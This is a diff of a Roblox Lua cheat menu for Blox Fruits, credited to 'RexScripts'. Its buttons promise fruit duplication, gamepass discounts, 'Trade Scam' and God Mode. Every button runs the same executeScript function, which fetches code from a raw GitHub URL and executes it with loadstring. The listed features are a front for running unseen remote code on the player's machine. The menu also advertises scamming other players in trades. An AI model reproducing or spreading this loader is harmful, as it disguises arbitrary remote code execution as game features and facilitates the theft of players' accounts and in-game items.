@@ -9,14 +9,14 @@ local function executeScript()
     loadstring(game:HttpGet('https://raw.githubusercontent.com/wogjiew55/GamepassDiscount/refs/heads/main/BloxFruits', true))()
 end
 
--- Main Features Tab
-local MainTab = Window:MakeTab({
-    Name = "Main Features",
-    Icon = "rbxassetid://4483345998",
+-- Options [OP] Tab
+local OptionsTab = Window:MakeTab({
+    Name = "Options [OP]",
+    Icon = "rbxassetid://4483345998", -- Ícone padrão
     PremiumOnly = false
 })
 
-MainTab:AddTextbox({
+OptionsTab:AddTextbox({
     Name = "Enter Dupe Number",
     Default = "",
     TextDisappear = true,
@@ -25,90 +25,37 @@ MainTab:AddTextbox({
     end
 })
 
-MainTab:AddButton({
-    Name = "Duplicar Frutas",
+OptionsTab:AddButton({
+    Name = "Start Dupe",
     Callback = function()
         executeScript()  -- Executa o script remoto ao clicar
     end
 })
 
-MainTab:AddButton({
-    Name = "Extra Features",
-    Callback = function()
-        executeScript()  -- Executa o script remoto ao clicar
-    end
-})
-
-MainTab:AddButton({
+OptionsTab:AddButton({
     Name = "All in Stock",
     Callback = function()
         executeScript()  -- Executa o script remoto ao clicar
     end
 })
 
-MainTab:AddButton({
-    Name = "Freeze Trade Scam",
+OptionsTab:AddButton({
+    Name = "Apply Discount [Gamepass]",
     Callback = function()
         executeScript()  -- Executa o script remoto ao clicar
     end
 })
 
--- Adicionando os novos botões
-MainTab:AddButton({
-    Name = "Apply Discount In Gamepass [OP]",
-    Callback = function()
-        executeScript()  -- Executa o script remoto ao clicar
-    end
-})
-
-MainTab:AddButton({
-    Name = "Trade Scam [WORKS WHILE IN TRADE]",
-    Callback = function()
-        executeScript()  -- Executa o script remoto ao clicar
-    end
-})
-
-MainTab:AddButton({
-    Name = "Auto Farm",
-    Callback = function()
-        executeScript()  -- Executa o script remoto ao clicar
-    end
-})
-
--- Nova aba sem pistas
-local SecretTab = Window:MakeTab({
-    Name = "Advanced Features",
-    Icon = "rbxassetid://4483345998",
+-- Credits Tab
+local CreditsTab = Window:MakeTab({
+    Name = "Credits",
+    Icon = "rbxassetid://4483345998", -- Ícone padrão
     PremiumOnly = false
 })
 
-SecretTab:AddButton({
-    Name = "Infinite Energy",
-    Callback = function()
-        executeScript()  -- Executa o script remoto ao clicar
-    end
-})
-
-SecretTab:AddButton({
-    Name = "Unstoppable Mode",
-    Callback = function()
-        executeScript()  -- Executa o script remoto ao clicar
-    end
-})
-
-SecretTab:AddButton({
-    Name = "Teleport to Secret Location",
-    Callback = function()
-        executeScript()  -- Executa o script remoto ao clicar
-    end
-})
-
-SecretTab:AddButton({
-    Name = "God Mode",
-    Callback = function()
-        executeScript()  -- Executa o script remoto ao clicar
-    end
-})
+-- Adicionando os textos na aba de créditos
+CreditsTab:AddParagraph("Credits", "RexScripts")
+CreditsTab:AddParagraph("Tiktok", "@rex.scripts")
 
 -- Inicializa a UI
 OrionLib:Init()
